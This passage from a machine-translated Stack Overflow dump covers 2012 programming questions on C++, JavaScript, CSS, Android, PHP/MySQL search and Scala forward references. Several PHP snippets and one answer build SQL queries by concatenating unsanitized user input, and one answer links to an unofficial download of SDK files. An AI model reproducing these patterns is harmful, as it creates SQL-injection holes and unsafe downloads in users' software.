org.apache.chemistry.opencmis.commons.exceptions.cmisconstraintException:Conflict 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:16:27.613

文档可能已经存在。您可以在那里查看 Alfresco 服务器上的日志以了解详细信息吗？

# c++ - 自定义向量类型

> ID：13328458
> 
> 赞同：0
> 
> 时间：2012-11-11T04:01:33.423
> 
> 标签：c++, class, vector, lnk

使用自定义类创建向量是否有任何限制？最近，每当我尝试以下语句时，我的编译器都会发送“LNK1120”警告：

```
vector<Team> teamList; 
```

如果这是非法的，是否有一种解决方法可以让我存储/组织一组这些实例？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:14:03.530

[LNK2001](http://msdn.microsoft.com/en-us/library/f6xx1b1z.aspx)后跟[LNK1120](http://msdn.microsoft.com/en-us/library/z98k84c3.aspx)是链接器错误。它（本质上）与您的自定义矢量类型无关。

查看您的代码，我可以在这里看到两个可能的原因：

1.  您只是忘记使用`std::vector`or`using namespace std;`并且链接器找不到您的意思`vector`
2.  上面的代码没有链接到包含该类的对象`Team`

当然，`vector`使用自定义类创建一个根本不是非法的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:14:01.843

LNK1120 - 未解决的外部问题？

我们需要更多的源代码和链接器输出。

# filepicker.io - 使用 Filepicker.io 禁用自动上传

> ID：13328463
> 
> 赞同：0
> 
> 时间：2012-11-11T04:02:14.330
> 
> 标签：filepicker.io

有没有办法使用 Filepicker.io 禁用自动上传？我希望能够选择几个文件，然后明确单击“上传”按钮作为上传过程。这对于 pickMultiple 功能特别方便，因为用户可能希望从系统上的各种文件夹中选择文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T16:32:18.307

正如 Liyan 在上述评论中所提到的，目前他们的 API 无法做到这一点。

# android - 新应用程序 - Build SDK Android 2.2 (API 8) 不可用。如何让它出现？

> ID：13328464
> 
> 赞同：1
> 
> 时间：2012-11-11T04:02:32.117
> 
> 标签：android, eclipse

我正在尝试为我的 Android 3.1 设备构建一个至少为 Android 2.2 (API 8) 的项目。但是，“Android 2.2 (API 8)”并不是列表中的选项之一。它只提供了 3 个选项：Android v2.1、v4.0 和 v4.0.3。第一个对我的项目来说太低了，而接下来的两个对我的设备来说太高了。

![在此处输入图像描述](../Images/131def95d0d583195dd6c0bcd53945d9.png)

我检查以确保我已经在 SDK 管理器中安装了 Android 2.2。

![在此处输入图像描述](../Images/eb69771a6a4cb81ff6456da48b577d02.png)

那么，如何让“Android 2.2 (API 8)”成为我项目的一个选项？我一定错过了一些非常简单的东西。谢谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:15:49.630

我会检查你的 /android-sdk-xxxx/platforms 文件夹。你应该在那里有一个名为 /android-8 的文件夹

如果这不存在，您可能没有实际安装它。尝试重新安装并重新启动 AVD。

如果仍然无法使用，请在 /platforms 文件夹中放置一份副本。 [http://www.sendspace.com/file/21r31h](http://www.sendspace.com/file/21r31h)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T06:10:34.587

仔细检查你的 PATH 到 sdk，它指向哪个 SDK？

# javascript - 使用共享变量创建对象

> ID：13328473
> 
> 赞同：1
> 
> 时间：2012-11-11T04:04:32.250
> 
> 标签：javascript, oop, object

我从来没有涉足过像这样制作 javascript 对象，但我认为我有充分的理由。

这是我的例子：

```
x = new Something(pallet,['blue','green','orange']);
x.try(['blue']); 
```

我想制作一个设置两个变量托盘和颜色数组的对象。

然后在 try 函数中我想传递一个数组，但在我想访问的函数`pallet`和颜色对象中。有人可以告诉我这是否可能吗？也许是一个小演示或教程？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:42:05.630

```
var Something = function( pallet, colors){
    this.try = function(arr){
        //stuff
    }
}; 
```

那是一个构造函数，然后您可以按照您的描述使用它。Try 将可以使用托盘和颜色。正如评论中提到的，try 不是一个很好的方法名称，因为它是一个保留字。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T05:24:39.273

```
function Something(pallet, colors) {
var myColors = colors;
var myPallet = pallet;

function getColors() {
    for (var i = 0; i < myColors.length; i++) {
        document.write(myColors[i] + "<br />");
    }
}

return {
    getColors: getColors
};
}

var mySomething = new Something('myNewPallet', ['green', 'red', 'blue']);
mySomething.getColors(); 
```

好的，所以我们在这里做的是创建一个闭包，然后将 getColors 函数返回给实例化Something对象的人。[您可以在此处](https://stackoverflow.com/questions/36636/what-is-a-closure)和[此处](http://jibbering.com/faq/notes/closures/)阅读有关闭包的信息。但是，基本上，您正在“关闭”颜色和托盘成员，并且由于 getColors 存在于 Something() 的上下文中，因此它可以访问Something 的所有成员。然后，通过将该函数返回给调用者，我们允许他们使用已“捕获”其托盘和颜色列表的对象调用该功能。

请记住，这是一个非常非常高级的一般闭包视图，特别是 Revealing Module 模式。阅读我在 JSFiddle上制作的这个[小提琴中包含的链接和猴子。](http://jsfiddle.net/NM7Zu/2/)我想一旦你明白了，你会很高兴的。

看起来你正在尝试制作一个 Pallet 对象，所以我为你创建了一个[新的小提琴](http://jsfiddle.net/NM7Zu/4/)。

这是代码：

```
function Pallet(palletName, palletColors) {
    this.name = palletName; //name is now a property of Pallet
    this.colors = palletColors; //colors is now a property of Pallet
}

Pallet.prototype.getColor = function(color) {
    //access Pallet properties using the 'this' keyword 
    //ex. this.colors or this.name
    if (this.colors.indexOf(color) > -1) {
        return 'Color found'; //Or whatever you need to do.
    }

    return 'Color not found'; //Or whatever you need to do.
};

var myPallet = new Pallet('myNewPallet', ['green', 'red', 'blue']);
document.write(myPallet.getColor('red'));​ //using document.write for simplicity 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-11T04:07:40.733

避免使用`new`-- 根据我的经验，我发现工厂方法更健壮。例如，您可以通过执行以下操作来完成您的要求：

```
function Something(pallet, colors) {
    var that = {};

    that.foo = function (moreColors) {
        // Here you can access pallet, colors, and moreColors.
        // Use "that" to refer to the current object, not "this".
    };

    return that;
}

x = Something(somePallet, ['blue', 'green', 'orange']);
x.foo(['blue']); 
```

# iphone - 从 nib 文件加载 CustomView

> ID：13328478
> 
> 赞同：0
> 
> 时间：2012-11-11T04:05:35.093
> 
> 标签：iphone, objective-c, facebook, nib

我有一个从 nib 文件加载自定义视图的代码，但是该自定义视图的变量存在问题。

```
- (id)initWithFrame:(CGRect)frame
 { self = [super initWithFrame:frame];
if (self) {
    // Initialization code
    HomeMainView* views = (HomeMainView*)[[[NSBundle mainBundle] loadNibNamed:@"HomeMainView" owner:self options:nil] objectAtIndex:0];
    [self release];

    NSArray* permission = [NSArray arrayWithObjects:@"user_photos",@"publish_stream", nil];

    FBLoginView* fbLogin = [[[FBLoginView alloc] initWithPublishPermissions:permission defaultAudience:FBSessionDefaultAudienceFriends] autorelease];

    [views.FBLogin addSubview:fbLogin];
    [views.homeButton setTitle:@"asdf" forState:UIControlStateNormal];

    self = views;

}
return self;
 } 
```

我正在尝试将 fbLogin 添加到 Nib 文件生成的视图对象中。问题是views.FBLogin 生成错误说无法识别的选择器。

有谁知道这里有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-14T21:48:16.507

我遇到了同样的问题，但这是因为我需要将此添加到我的应用程序委托 didFinishLaunchingWithOptions ：

```
[FBLoginView class] 
```

没有这个，UIView 是 UIView 而不是 FBLoginView，因此是无法识别的选择器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T20:52:10.483

确保您已在界面构建器中为视图设置了自定义类。选择视图并按 cmd+option+3 并设置自定义类。

# html - 无法将整个 div 移动到页面中心

> ID：13328480
> 
> 赞同：1
> 
> 时间：2012-11-11T04:06:02.247
> 
> 标签：html, css

我是 Web 开发的新手，我正在尝试将整个 div 移动到页面的中心。但我无法做到这一点，也没有得到任何错误。下面是html页面的代码。

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<style>
#chart {
width:500px;
height:450px;
background-color:white;
 -moz-border-radius: 20px;
    -webkit-border-radius: 20px;
    -khtml-border-radius: 20px;
    border-radius: 20px;
    behavior: url(PIE/PIE.htc);
}
</style>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Here goes some tilte</title>
<meta name="DESCRIPTION" content="Determine your ring size in different countries.">
<meta name="KEYWORDS"
content="ring, size, USA, american, german, french, british, japanese, swiss">
<SCRIPT LANGUAGE="JavaScript" TYPE="text/javascript">
function changeValues(which) {
  document.countries.D1.selectedIndex = which;
  document.countries.D2.selectedIndex = which;
  document.countries.D3.selectedIndex = which;
  document.countries.D4.selectedIndex = which;
  document.countries.D5.selectedIndex = which;
  document.countries.D6.selectedIndex = which;
  document.countries.D7.selectedIndex = which;
  document.countries.D8.selectedIndex = which;
  document.countries.D9.selectedIndex = which;
}
// --></script>

<link href="/style.css" rel="stylesheet" type="text/css">
<link href="/print.css" rel="stylesheet" type="text/css"  media="print">

<script language="JavaScript" src="/misc_functions.js" type="text/javascript"></script>
</head>
<body bgcolor="pink">
<div  align="center" id="chart" >
<center>
<table border="0" cellpadding="10" cellspacing="0" width="450">
<tr>
<td width="470" valign="top" class="content">
<div align="center">
<span class="red"><font color="Black"><h3>Here will be having a static data on the form<h3></font></span>
</div>
</td>
</tr>
</table>
<!-- Place main data here -->
<script language="JavaScript" src="/browser_detection.js" type="text/javascript"></script>
<noscript>
<blockquote>
<p><font size="3" color="#FF0000"><b>You do not have JavaScript enabled.</b></font><br>
<font size="2" color="#000080">The conversions on this site require the use of JavaScript so please enable before continuing.
For assistance in enabling JavaScript, please contact the webmaster.</font></p>
</blockquote>
</noscript>
    <form method="POST" name="countries">
<div align="center">
<table border="0" style="border: 1px solid rgb(255,0,0)">
  <tr>
    <td align="center" bgcolor="#DFDFDF">USA </td>
    <td align="center" bgcolor="#D5D5FF">INDIA</td>
    <td align="center" bgcolor="#D5D5FF">PAKISTAN</td>
    <td align="center" bgcolor="#D5D5FF">CHINA</td>
  </tr>
  <tr>
    <td align="center" bgcolor="#DFDFDF"><select name="D1" size="1"
    onChange="changeValues(document.countries.D1.selectedIndex);">
      <option>&nbsp;&nbsp;---</option>
<option>Damodar</option>
      </select></td>
    <td align="center" bgcolor="#D5D5FF"><select name="D2" size="1"
    onChange="changeValues(document.countries.D2.selectedIndex);">
      <option>&nbsp;&nbsp;---</option>
      <option>Damodar</option>
      </select></td>
    <td align="center" bgcolor="#D5D5FF"><select name="D3" size="1"
    onChange="changeValues(document.countries.D3.selectedIndex);">
      <option>&nbsp;&nbsp;---</option>
      <option>Damodar</option>
      </select></td>
    <td align="center" bgcolor="#D5D5FF"><select name="D4" size="1"
    onChange="changeValues(document.countries.D4.selectedIndex);">
      <option>&nbsp;&nbsp;---</option>
      <option>Damodar</option>
     </select></td>
  </tr>
</table>
</div>
<div align="center">
<table border="0" style="border: 1px solid rgb(255,0,0)">
  <tr>
    <td align="center" bgcolor="#DFDFDF">British</td>
    <td align="center" bgcolor="#DFDFDF">French</td>
    <td align="center" bgcolor="#DFDFDF">German</td>
    <td align="center" bgcolor="#DFDFDF">Japanese</td>
    <td align="center" bgcolor="#DFDFDF">Swiss</td>
  </tr>
  <tr>
    <td align="center" bgcolor="#DFDFDF"><select name="D5" size="1"
    onChange="changeValues(document.countries.D5.selectedIndex);">
      <option>&nbsp;&nbsp;---</option>
      <option>Damodar</option>
     </select></td>
    <td align="center" bgcolor="#DFDFDF"><select name="D6" size="1"
    onChange="changeValues(document.countries.D6.selectedIndex);">
      <option>&nbsp;&nbsp;---</option>
      <option>Damodar</option>
     </select></td>
    <td align="center" bgcolor="#DFDFDF"><select name="D7" size="1"
    onChange="changeValues(document.countries.D7.selectedIndex);">
      <option>&nbsp;&nbsp;---</option>
      <option>Damodar</option>
      </select></td>
    <td align="center" bgcolor="#DFDFDF"><select name="D8" size="1"
    onChange="changeValues(document.countries.D8.selectedIndex);">
      <option>&nbsp;&nbsp;---</option>
      <option>Damodar</option>
      </select></td>
    <td align="center" bgcolor="#DFDFDF"><select name="D9" size="1"
    onChange="changeValues(document.countries.D9.selectedIndex);">
      <option>&nbsp;&nbsp;---</option>
      <option>Damodar</option>
    </select></td>
  </tr>
</table>
      </div>
      </center>
    </form>
    <table>
    <tr>
    <td>
    <p align="center"><font color="#800000">Here will be having a static data on the form</font></p>
    <p><font color="#000080"><big>Here will be having a static data on the form</big></font><ol>
      <li><font color="#004080">Here will be having a static data on the form</font></li>
      <li><font color="#004080">Here will be having a static data on the form</font></li>
    </ol></p>
    </td>
    </tr>
<table>
</center>
</div>
</div>
</body>
</html> 
```

下面我附上截图，你可以找到曲线框，它留在页面上，我希望那个曲线框和下面的元素居中。请任何人建议如何做到这一点

![在此处输入图像描述](../Images/7234403712dff7490bf17dbfc6b8e43f.png)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-11T04:08:55.690

```
#chart {
  margin: 0 auto;
} 
```

使用边距使事物居中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T04:17:45.697

尝试

```
#chart {
  margin: 0 auto;
}

<div id="chart" >    //remove align 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T04:21:18.153

您已将该 div 放置在表格中。所以你需要做一些事情。

```
<table border="0" cellpadding="10" cellspacing="0" width="450">
<tr>
<td width="470" valign="top" class="content">
<div align="center">
<span class="red"><font color="Black"><h3>Here will be having a static data on the form<h3></font></span> 
```

将表格更改为 100% 将 td 的对齐居中，将 div 和宽度保持为 100%

```
<table border="0" cellpadding="10" cellspacing="0" width="100%">
<tr>
<td width="100%" valign="top" class="content" style="text-align:center;">
<div align="center"> 
```

# php - echo php自查询

> ID：13328481
> 
> 赞同：1
> 
> 时间：2012-11-11T04:06:02.713
> 
> 标签：php, javascript

我在我的脚本标签中使用下面的行，这是那行：

```
var url = "<?php echo $_SERVER['PHP_SELF']; ?>"; 
```

上面的行工作正常，它重定向到[http://mysite.com](http://mysite.com)，但我希望它重定向到[http://mysite.com/shop/c/mycategoryname](http://mysite.com/shop/c/mycategoryname)

mycatgeoryname 应该是 url 中的任何类别名称，我应该得到..

任何人都可以请..？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:19:27.150

你正在寻找`[$_SERVER['PATH_INFO']](http://php.net/manual/en/reserved.variables.server.php)`

这将返回一个包含与路径相关的所有信息的数组。您应该能够看到通过执行返回的内容`print_r($_SERVER['PATH_INFO']);`

希望这可以帮助。

# ruby - 包含多个参数和正文的 Ruby HTTP Post

> ID：13328484
> 
> 赞同：1
> 
> 时间：2012-11-11T04:06:37.450
> 
> 标签：ruby, http, post

我需要使用三个参数和一个由 512 个字节组成的正文进行发布。我可以得到正确的身体，但我似乎无法获得要采用的参数：

```
require 'net/http'

@ip_address = Array['cueserver.dnsalias.com']
@cueserver = 0
@playback = 'p1'

def send_cuescript(data) 

  params = {'id' => '1', 'type' => "20",'dst' => 'RES'  }

  begin
    url = URI.parse('http://'+ @ip_address[@cueserver] + '/set.cgi')
    http = Net::HTTP.new(url.host, url.port)

    response, body = http.post(url.path, params, data)

   rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError,
          Net::HTTPBadResponse, Net::HTTPHeaderSyntaxError, Net::ProtocolError => e
   end        
 response_array = []
 puts 'got this value: ' + response.to_s
 response.body.each_byte { |e| response_array.push(e.to_s(16))}
end

data_array = Array.new(512, "\x80")
send_cuescript(data_array.join) 
```

我收到来自 initialize_http_header 的错误。我知道必须有一种方法可以分别设置参数和主体，但我似乎找不到任何对此的参考。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T15:24:01.423

为什么必须在 url 中发送部分参数而在正文中发送部分参数？如果您必须这样做，请尝试

url = URI.parse('http://'+ @ip_address[@cueserver] + '/set.cgi?' + params.to_param)

PS：to_param 来自积极支持。如果您不使用主动支持，则需要自己编写。

# php - 关键字相关性 PHP MySQL 搜索引擎

> ID：13328486
> 
> 赞同：0
> 
> 时间：2012-11-11T04:07:00.613
> 
> 标签：php, mysql, search-engine

我不知道为什么我在任何地方都找不到这个。我认为这将是非常普遍的要求。我正在用 PHP 编写一个搜索引擎，以在 MySQL 数据库中搜索用户输入的关键字。

表中有几列，但只有 2 列需要搜索。它们被命名为 file_Title 和 file_Desc。把它想象成一个分类广告。项目标题和描述。

例如，用户会搜索“John Deere Lawn Tractor”。我想要发生的是所有这 4 个词都显示在列表顶部的分类。然后结果只有 3 个，依此类推。

我在[http://www.roscripts.com/PHP_search_engine-119.html阅读了一个非常好的网页](http://www.roscripts.com/PHP_search_engine-119.html)

从该作者示例中，我有以下代码：

```
<?php
    $search = 'John Deere Lawn Tractors';
    $keywords = split(' ', $search);

    $sql = "SELECT DISTINCT COUNT(*) As relevance, id, file_Title, file_Desc FROM Listings WHERE (";

    foreach ($keywords as $keyword) {
        echo 'Keyword is ' . $keyword . '<br />';
        $sql .= "(file_Title LIKE '%$keyword%' OR file_Desc LIKE '%$keyword%') OR ";
    }
    $sql=substr($sql,0,(strLen($sql)-3));//this will eat the last OR

    $sql .= ") GROUP BY id ORDER BY relevance DESC";
    echo 'SQL is ' . $sql;  

    $query = mysql_query($sql) or die(mysql_error());
    $Count = mysql_num_rows($query);
    if($Count != 0) {
                echo '<br />' . $Count . ' RESULTS FOUND';
        while ($row_sql = mysql_fetch_assoc($query)) {//echo out the results
            echo '<h3>'.$row_sql['file_Title'].'</h3><br /><p>'.$row_sql['file_Desc'].'</p>';
        }
    } else  {
        echo "No results to display";
    } 
```

?>

输出的 SQL 字符串是这样的：

```
 SELECT DISTINCT COUNT(*) As relevance, id, file_Title, file_Desc FROM Listings 
  WHERE ((file_Title LIKE '%John%'
    OR file_Desc LIKE '%John%')
    OR (file_Title LIKE '%Deere%' 
    OR file_Desc LIKE '%Deere%') 
    OR (file_Title LIKE '%Lawn%' 
    OR file_Desc LIKE '%Lawn%') 
    OR (file_Title LIKE '%Tractors%' 
    OR file_Desc LIKE '%Tractors%') ) 
 GROUP BY id 
 ORDER BY relevance DESC 
```

使用此代码，我从我的数据库中获得 275 个结果。我的问题是它真的不按行中找到的关键字数量排序。它似乎是按 id 排序结果。如果我删除 'GROUP BY id' 那么它只返回 1 个结果而不是所有结果，这真的让我很困惑！

我也尝试在数据库中切换到 FULLTEXT，但似乎也无法做到这一点，所以我更愿意坚持使用`LIKE %Keyword%`语法。

任何帮助表示赞赏！谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T04:24:47.687

我会建议一种完全不同的方法。您的方法很麻烦，效率低下，对数据库很重，并且随着越来越多的记录添加到您的数据库中，可能会非常缓慢。

我建议如下：

1.  为关键字创建一个单独的表格。
2.  创建一个您不想索引的非关键字列表（如常见的英语介词等），以便不包括在内。您可能可以在网上找到它们的列表，随时可用。
3.  添加新条目时，您将字符串拆分为单独的关键字，省略步骤 2 中的关键字，并将它们插入在步骤 3 中创建的表中（如果还没有的话）。
4.  在一个单独的表中，使用指向关键字表的外键，将 classifed_ad 与关键字相关联。

如果您的分类广告被编辑，则步骤 3 和 4 必须再次执行（即从关联表中删除在步骤 4 中插入的任何关键字，并且重新分析关键字并与分类广告重新关联）。

一旦你有了这个结构，你所要做的就是搜索关联表并按匹配关键字的数量排序。您甚至可以在其中添加一个额外的列，并将该关键字的出现次数放在文章中，以便您也按此排序。

那会快得多。

我曾经使用过一个名为[Sphider](http://www.sphider.eu/)的脚本，它做类似的事情。不确定它是否仍在维护，但它在解析的网页上以非常相似的方式工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T05:40:58.243

我知道你说你有问题`FULLTEXT`，但我强烈建议你回去再试一次。FULLTEXT 索引和搜索旨在做你正在做的事情，当在 WHERE 子句中使用 MATCH 命令时，*MySQL 会自动将行从最高相关性到最低相关性排序。*

有关全文的更多信息，请查看[http://dev.mysql.com/doc/refman/5.0/en/fulltext-search.html](http://dev.mysql.com/doc/refman/5.0/en/fulltext-search.html)

此外，请特别注意同一页面上 Patrick O'Lone 的评论，其中一些引用如下......

> 应该在文档中指出，IN BOOLEAN MODE 几乎总是会返回 1.0 的相关性。为了获得有意义的相关性，您需要：
> 
> SELECT MATCH('Content') AGAINST ('keyword1 keyword2') as Relevance FROM table WHERE MATCH ('Content') AGAINST('+keyword1 +keyword2' IN BOOLEAN MODE) HAVING Relevance > 0.2 ORDER BY Relevance DESC
> 
> 请注意，您正在执行常规相关性查询以获取与使用 BOOLEAN MODE 的 WHERE 子句相结合的相关性因素。BOOLEAN MODE 为您提供满足 BOOLEAN 搜索要求的子集，相关性查询满足相关性因素，并且 HAVING 子句（在这种情况下）确保文档与搜索相关（即得分小于 0.2 的文档被认为无关紧要）。这也允许您按相关性排序。

# mysql - 是否可以有一个文本框，他们可以在其中输入要在列中搜索的信息，他们也可以通过使用下拉菜单进行选择？

> ID：13328488
> 
> 赞同：0
> 
> 时间：2012-11-11T04:07:22.337
> 
> 标签：mysql

例如，用户想按导演的姓氏搜索电影数据库，因此用户将输入 Smith，然后在下拉菜单中选择导演的姓氏。我只需要知道如何将 post 变量放入 SELECT --> WHERE 函数

```
$columnsch = $_POST["columnsearch"]; 
$contentsch = $_POST["contentsearch"];

  $result = mysql_query("SELECT * FROM movies WHERE $columnsch ='$contentsch'");
if (!$result) {
    die ("Database Query Failed: ".mysql_error()); 
```

我知道上面的代码是不正确的，但它给出了我想要实现的总体思路。Zdravko，我对此真的很陌生，我不确定你的代码行在哪里，例如 sql 是否适合我所拥有的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:13:27.197

您可以做两件事：首先是根据搜索条件生成 sql：

```
sql = sql + 'WHERE ' + SearchField + ' = "'+ SearchValue + '";' 
```

另一种是这样写sql：

```
 WHERE (@SearchField = 'Director' and Ditector = @SearchValue)
 OR (@SerarchField = 'Star' and Star = @SearchValue)
 .... 
```

# c++ - C++ 中断？

> ID：13328491
> 
> 赞同：0
> 
> 时间：2012-11-11T04:07:54.087
> 
> 标签：c++, interrupt

我想知道 C++ 是否有任何方式进行中断。我希望一个程序将信息存储在文本文件中，而另一个程序根据文本文件中的内容打印一条语句。由于我希望它尽可能准确，因此我需要在更新程序更新文件时中断打印程序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:11:45.327

C++ 本身没有提供这种能力，它对其他可能运行或可能不运行的程序一无所知。

您需要研究的是 IPC（进程间通信），这是您的操作系统可能会提供的。

诸如信号、共享内存、信号量、消息队列等之类的东西。

由于您似乎使用文件本身作为向其他进程传递内容的方法，因此信号可能是要走的路。您只需从进程 A 向进程 B 发出信号，然后信号处理程序将在后者中运行。

当然，这一切都取决于您所针对*的*操作系统。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T04:17:12.300

如果您使用的是 Windows，则可以使用[FindFirstChangeNotification](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364417%28v=vs.85%29.aspx)。

这是我的一些旧代码。这是在它自己的线程中运行的：

```
DWORD CDiskWatcher::Run(void *vpParameter)
{
    CFileNotifyInterface *pIface = (CFileNotifyInterface *)vpParameter;

    HANDLE handles[2];
    handles[0] = m_hQuitEvent;
    handles[1] = ::FindFirstChangeNotification(m_szPath, FALSE, FILE_NOTIFY_CHANGE_LAST_WRITE|FILE_NOTIFY_CHANGE_FILE_NAME);
    DWORD dwObject;
    if (INVALID_HANDLE_VALUE != handles[1]) {
        do {
            // Wait for the notification
            dwObject = ::WaitForMultipleObjects(2, handles, FALSE, INFINITE);
            if (WAIT_OBJECT_0 + 1 == dwObject) {
                // Continue waiting...
                ::FindNextChangeNotification(handles[1]);
                pIface->FireFileSystemChange(m_szPath);
            }
        } while (WAIT_OBJECT_0 != dwObject);
        // Close handle
        ::FindCloseChangeNotification(handles[1]);
    }
    return 0;
} 
```

注意 m_hQuitEvent 是使用 CreateEvent() 创建的，而 CFileNotifyInterface 用于回调：

```
class CFileNotifyInterface
{
public:
    virtual void FireFileSystemChange(const char *szPath) = 0;
}; 
```

# c++ - irrlicht 模型加载/动画

> ID：13328492
> 
> 赞同：2
> 
> 时间：2012-11-11T04:08:09.103
> 
> 标签：c++, animation, textures, mesh, irrlicht

我一直在尝试（几个小时）来正确加载、显示和动画的 b3d 模型。该模型在第 0 帧和第 45 帧之间有一个动画，它是在搅拌机中制作和绘制的（整个套件）作为测试模型。只显示了模型的一半，它完全是白色的，并且没有移动。
我一直在谷歌上搜索有关将 b3d 加载到 irrlicht 及其动画系统的信息，但尝试从 b3d 文件加载纹理失败以及我将所有其他信息合并到程序中。

[这](http://picpaste.com/af00c9fec265405db3890aa86e14d661.jpg)是实际结果图片的链接。

[这](http://pastebin.com/tyMfJ8GR)是代码的链接（用无关部分的注释缩短）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-09-10T23:33:40.460

您是否正确定义了“节点”？如果没有，试试这个：

```
IAnimatedMeshSceneNode* node = smgr->addAnimatedMeshSceneNode (smgr->getMesh ("mesh.b3d")); 
```

如果您将节点添加为`IMeshSceneNode`动画将不会显示。至于纹理，我相信`irrlicht`你必须手动设置所有纹理。在 'if (node)' 块中试试这个：

```
node->setMaterialTexture (0, driver->getTexture ("texture.bmp")); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-23T16:10:21.057

通过 Blender 导出时，某些绘画工具不会出现在模型上。您可能已经使用了一些，请尝试使用您在网上使用的工具查找任何可能的问题。

你也确定你点亮模型？这也可能导致问题。

我有点着急atm无法检查代码，我可能稍后再看。希望能解决

# scala - Scala中的“前向引用扩展了值的定义”是什么意思？

> ID：13328502
> 
> 赞同：46
> 
> 时间：2012-11-11T04:09:46.520
> 
> 标签：scala

我不断得到

```
Forward reference extends over definition of value a 
```

尝试编译我的应用程序（在 SBT 内部）时出错。

`a`只是，错误是通过在定义`val a = ""`之前访问（函数的）特定参数来触发的。`a`该参数是一个简单案例类类型，具有所有三个类型的字段（枚举值的 Option 的`Option[...]`2和 1）。`Option[org.joda.time.DateTime]`

“前向参考延伸到价值的定义”到底意味着什么？对抗它的方法是什么？

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-11-11T04:34:49.777

错误消息意味着您有一个方法的前向引用，即您在定义它之前调用了一个方法，并且值的定义`x`出现在该前向引用和方法的定义之间。如果引用和被引用的方法定义之间没有值定义，则只有前向引用才是合法的。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2016-04-05T00:00:18.607

基本上这是一个错误。

解决方法是在调用它之前声明一个方法。我不知道为什么。

```
def a(input: String){

}

val k = a("ravi") 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2012-11-11T05:56:04.080

根据您的 scalac 版本，存在合成方法导致此错误的错误。

[https://issues.scala-lang.org/browse/SI-6278](https://issues.scala-lang.org/browse/SI-6278)

说明，想象 f 是生成的：

```
object Test {
  def main(args: Array[String]) {
    class NotUsed {val x = f}
    val dummy = false
    def f = true
  }
} 
```

案例类、默认参数和隐式类涉及合成。

在该票证的示例代码（已修复）中，您可以通过将隐式移动到函数末尾来破坏 ok 方法：

```
object tiny {

  def main(args: Array[String]) {
    ok(); nope()
  }
  def ok() {
    class Foo(val i: Int) {
      def foo[A](body: =>A): A = body
    }
    implicit def toFoo(i: Int): Foo = new Foo(i)

    val k = 1
    k foo println("k?")
    val j = 2
  }
  def nope() {
    implicit class Foo(val i: Int) {
      def foo[A](body: =>A): A = body
    }

    val k = 1
    k foo println("k?")
    //lazy
    val j = 2
  }
} 
```

> 有什么方法可以对抗呢？

正如代码中的注释所暗示的那样，使定义变得惰性是一种解决方法。

插图2，想象一下函数太长以至于你没有注意到命名问题：

```
object Test {
  def main(args: Array[String]) {
    class NotUsed {val xs = args}
    val dummy = false
    // oops, shadows the parameter
    def args = Seq("a","b","c")
  }
} 
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2013-03-01T14:02:05.690

如果它在某处被引用并且 scalac 与序列混淆，让它变得懒惰可以解决问题

我想答案可能为时已晚，而且由于我看不到您实际尝试做的事情，因此我不确定这是否可以解决问题。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-06-23T17:22:10.810

sepp2k给出的答案的一个例子

```
object ForwardReferenceTest {

  def main(args: Array[String]): Unit = {
    test
    val x = 1
    def test = println("hi")
  }
} 
```

你会得到错误

```
Error:(7, 5) forward reference extends over definition of value x
    test
    ^ 
```

该函数`test`是在调用之后定义的，并且在两者之间有一个值定义`x`。删除/移动`val x`定义将解决问题。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-09-21T18:55:34.567

该消息意味着在运行时 scala 无法找到在您的方法中调用的方法的引用。这通常发生在您尝试调用方法并且被调用方法的实现在调用方法之后。

例如：

```
implicit val userDetails: Reads[UserDetails] = (
          (JsPath \ "name").read[String] and
            (JsPath \ "providers").read[List[Provider]]
          )(UserDetails.apply _) 

implicit val providers: Reads[Provider] = (
          (JsPath \ "providerName").read[String] and
            (JsPath \ "providerUserId").read[String] and
            (JsPath \ "authtoken").read[String]
          )(Provider.apply _) 
```

以及正确的方法。

```
implicit val providers: Reads[Provider] = (
      (JsPath \ "providerName").read[String] and
        (JsPath \ "providerUserId").read[String] and
        (JsPath \ "authtoken").read[String]
      )(Provider.apply _)

     implicit val userDetails: Reads[UserDetails] = (
      (JsPath \ "name").read[String] and
        (JsPath \ "providers").read[List[Provider]]
      )(UserDetails.apply _) 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-04-10T05:56:38.073

你应该检查你的进口。它必须从导入中导入变量名，变量名必须在导入到您的代码中的某个库中使用。删除导入。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-11-23T13:58:15.220

